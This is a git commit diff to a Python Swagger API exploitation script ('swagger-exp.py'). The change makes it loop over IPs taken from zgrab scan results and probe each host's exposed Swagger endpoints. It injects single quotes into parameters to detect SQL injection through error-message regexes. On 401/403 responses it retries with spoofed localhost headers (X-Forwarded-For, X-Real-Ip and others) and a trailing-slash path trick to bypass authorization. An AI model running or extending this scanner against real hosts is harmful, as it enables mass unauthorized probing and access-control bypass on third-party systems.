27f28d5fc751f9debb208363362796e11f67a79c
1zhd24 <lzhd24@gmail.com>
2023-05-10 19:59:43 +0800

    first change

--- swagger-exp.py
+++ swagger-exp.py
@@ -12,6 +12,8 @@ import subprocess
 import threading
 import copy
 import os
+from bs4 import BeautifulSoup
+import re
 
 try:
     import urlparse
@@ -32,6 +34,12 @@ scheme = 'http'    # default value
 headers = {'User-Agent': 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'}
 auth_bypass_detected = False
 
+proxies = {
+    'http': 'http://127.0.0.1:8080' # use burp to debug
+}    
+
+sql_error_regex = ''
+sql_error_pattern = ''
 
 def print_msg(msg):
     if msg.startswith('[GET] ') or msg.startswith('[POST] '):
@@ -43,7 +51,7 @@ def print_msg(msg):
 
 def find_all_api_set(start_url):
     try:
-        text = requests.get(start_url, headers=headers, verify=False).text
+        text = requests.get(start_url, headers=headers, verify=False, proxies=proxies).text
         if text.strip().startswith('{"swagger":"'):    # from swagger.json
             api_set_list.append(start_url)
             print_msg('[OK] [API set] %s' % start_url)
@@ -63,7 +71,7 @@ def find_all_api_set(start_url):
 
 def process_doc(url):
     try:
-        json_doc = requests.get(url, headers=headers, verify=False).json()
+        json_doc = requests.get(url, headers=headers, verify=False,proxies=proxies).json()
         base_url = scheme + '://' + json_doc['host'] + json_doc['basePath']
         base_url = base_url.rstrip('/')
         for path in json_doc['paths']:
@@ -100,7 +108,11 @@ def process_doc(url):
                             para_format = parameter['type'] if 'type' in parameter else 'unkonwn'
 
                         is_required = '' if parameter['required'] else '*'
-                        params_str += '&%s=%s%s%s' % (para_name, is_required, para_format, is_required)
+                        #小驼峰命名参数，例如：sortField
+                        if re.match(r'^[a-z]+([A-Z][a-z]+)+$', para_name) and "string" in para_format:
+                            params_str += '&%s=%s' % (para_name, 'test\'')#单引号测试SQL注入
+                        else:
+                            params_str += '&%s=%s%s%s' % (para_name, is_required, para_format, is_required)
                     params_str = params_str.strip('&')
                     if sensitive_params:
                         print_msg('[*] Possible vulnerable param found: %s, path is %s' % (
@@ -118,16 +130,30 @@ def scan_api(method, base_url, path, params_str, error_code=None):
     _params_str = params_str.replace('*string*', 'a')
     _params_str = _params_str.replace('*int64*', '1')
     _params_str = _params_str.replace('*int32*', '1')
+    _params_str = _params_str.replace('*boolean*', 'true')
     _params_str = _params_str.replace('=string', '=test')
     api_url = base_url + path
     if not error_code:
         print_msg('[%s] %s %s' % (method.upper(), api_url, params_str))
+    else:
+        #403bypass
+        headers["Client-IP"] = "127.0.0.1"
+        headers["X-Real-Ip"] = "127.0.0.1"
+        headers["Redirect"] = "127.0.0.1"
+        headers["Referer"] = "127.0.0.1"
+        headers["X-Client-IP"] = "127.0.0.1"
+        headers["X-Custom-IP-Authorization"] = "127.0.0.1"
+        headers["X-Forwarded-By"] = "127.0.0.1"
+        headers["X-Forwarded-For"] = "127.0.0.1"
+        headers["X-Forwarded-Host"] = "127.0.0.1"
+        headers["X-Forwarded-Port"] = "80"
+        headers["X-True-IP"] = "127.0.0.1"
     if method.upper() == 'GET':
-        r = requests.get(api_url + '?' + _params_str, headers=headers, verify=False)
+        r = requests.get(api_url + '?' + _params_str, headers=headers, verify=False,proxies=proxies)
         if not error_code:
             print_msg('[Request] %s %s' % (method.upper(), api_url + '?' + _params_str))
     else:
-        r = requests.post(api_url, data=_params_str, headers=headers, verify=False)
+        r = requests.post(api_url, data=_params_str, headers=headers, verify=False,proxies=proxies)
         if not error_code:
             print_msg('[Request] %s %s \n%s' % (method.upper(), api_url, _params_str))
 
@@ -138,6 +164,9 @@ def scan_api(method, base_url, path, params_str, error_code=None):
     if not error_code:
         print_msg('[Response] Code: %s Content-Type: %s Content-Length: %s' % (
             r.status_code, content_type, content_length))
+        if 'application/json' in content_type:
+            if sql_error_pattern.match(r.text):
+                print_msg('[VUL] *** SQL Injection ***')
     else:
         if r.status_code not in [401, 403] or r.status_code != error_code:
             global auth_bypass_detected
@@ -150,7 +179,7 @@ def scan_api(method, base_url, path, params_str, error_code=None):
 
     # Auth Bypass Test
     if not error_code and r.status_code in [401, 403]:
-        path = '/' + path
+        path = '/' + path + '/'
         scan_api(method, base_url, path, params_str, error_code=r.status_code)
 
 
@@ -163,7 +192,7 @@ class RequestHandler(SimpleHTTPRequestHandler):
         if self.path.startswith('/proxy?url='):
             url = self.path[11:]
             if url.lower().startswith('http') and url.find('@') < 0:
-                text = requests.get(url, headers=headers, verify=False).content
+                text = requests.get(url, headers=headers, verify=False,proxies=proxies).content
                 if text.find('"schemes":[') < 0:
                     text = text[0] + '"schemes":["https","http"],' + text[1:]    # HTTP(s) Switch
                 global auth_bypass_detected
@@ -207,25 +236,53 @@ def chrome_open(chrome_path, url, server):
 
 if __name__ == '__main__':
     out_file = codecs.open('api_summary.txt', 'w', encoding='utf-8')
-    if len(sys.argv) > 1:
+    in_file = codecs.open('zgrab_result.txt', 'r', encoding='utf-8')
+
+    #初始化所有的SQL报错正则
+    with codecs.open('errors.xml', 'r', encoding='utf-8') as f:
+        soup = BeautifulSoup(f.read(), 'lxml')
+        for error in soup.find_all('error'):
+            regexp = error['regexp']
+            sql_error_regex += "(" + regexp + ")" + "|"
+    sql_error_regex = sql_error_regex[:-1]
+    sql_error_pattern = "(?is)"+sql_error_regex
+    sql_error_pattern = re.compile(sql_error_regex)
+
+    #初始化所有的未授权访问swaggerui地址
+    swagger_urls = []
+    for line in in_file.readlines():
+        line = line.strip()
         try:
-            _scheme = urlparse.urlparse(sys.argv[1]).scheme.lower()
+            data = json.loads(line)
+            ip = data['ip']
+            url = f"http://{ip}/swagger-resources"
+            swagger_urls.append(url)
+        except:
+            continue
+    swagger_urls = list(set(swagger_urls))  # 去重
+
+    for swagger_url in swagger_urls:
+        try:
+            _scheme = urlparse.urlparse(swagger_url).scheme.lower()
         except Exception as e:
-            _scheme = urllib.parse.urlparse(sys.argv[1]).scheme.lower()
+            _scheme = urllib.parse.urlparse(swagger_url).scheme.lower()
         if _scheme.lower() == 'https':
             scheme = 'https'
-        find_all_api_set(sys.argv[1])
+        find_all_api_set(swagger_url)
+        print_msg('[all api set] %s' % api_set_list)
         for url in api_set_list:
             process_doc(url)
 
-    server = ThreadingSimpleServer(('127.0.0.1', 0), RequestHandler)
-    url = 'http://127.0.0.1:%s' % server.server_port
-    print_msg('Swagger UI Server on: %s' % url)
-    chrome_path = get_chrome_path()
-    if not chrome_path:
-        print_msg('[ERROR] Chrome executable not found')
-    else:
-        print_msg('Open Swagger UI with chrome')
-        threading.Thread(target=chrome_open, args=(chrome_path, url, server)).start()
 
-    server.serve_forever()
+
+    # server = ThreadingSimpleServer(('127.0.0.1', 0), RequestHandler)
+    # url = 'http://127.0.0.1:%s' % server.server_port
+    # print_msg('Swagger UI Server on: %s' % url)
+    # chrome_path = get_chrome_path()
+    # if not chrome_path:
+    #     print_msg('[ERROR] Chrome executable not found')
+    # else:
+    #     print_msg('Open Swagger UI with chrome')
+    #     threading.Thread(target=chrome_open, args=(chrome_path, url, server)).start()
+
+    # server.serve_forever()
